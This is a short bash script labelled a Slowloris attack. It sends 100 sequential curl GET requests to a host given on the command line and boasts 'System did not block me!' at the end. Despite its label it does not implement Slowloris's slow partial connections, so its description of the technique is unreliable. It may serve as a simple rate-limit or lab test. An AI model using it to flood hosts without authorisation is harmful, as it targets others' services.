#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting Slowloris attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

sleep 5s;

# make a loop to perform slowloris attack
for _ in {1..100}
do
  TMP=$(curl -X GET "$HOST")
  echo Got: "$TMP"
done

echo "System did not block me!";

exit 0;